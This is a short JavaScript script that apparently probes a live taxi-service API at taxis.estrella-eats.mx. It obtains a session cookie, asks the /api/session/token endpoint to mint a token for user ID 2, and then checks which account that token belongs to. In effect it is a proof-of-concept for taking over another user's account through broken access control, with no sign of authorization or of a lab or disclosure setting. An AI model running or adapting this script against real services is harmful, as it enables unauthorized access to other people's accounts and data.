async function test() {
  const token = "";
  // First, get session
  const res1 = await fetch('https://taxis.estrella-eats.mx/api/session?token=' + token, { headers: { 'Cookie': '' } });
  const cookie = res1.headers.get('set-cookie');
  
  // Now generate token for user ID 2 (if exists)
  const params = new URLSearchParams();
  params.append('userId', '2');
  params.append('expiration', '2024-12-12T00:00:00.000Z');
  
  const res2 = await fetch('https://taxis.estrella-eats.mx/api/session/token', {
    method: 'POST',
    headers: { 'Cookie': cookie, 'Content-Type': 'application/x-www-form-urlencoded', 'Accept': 'application/json' },
    body: params
  });
  
  const generated = await res2.text();
  console.log('Generated token:', generated);
  
  // Test who the generated token belongs to
  const res3 = await fetch('https://taxis.estrella-eats.mx/api/session?token=' + generated);
  const user = await res3.json();
  console.log('Token belongs to:', user.name, user.id);
}
test();
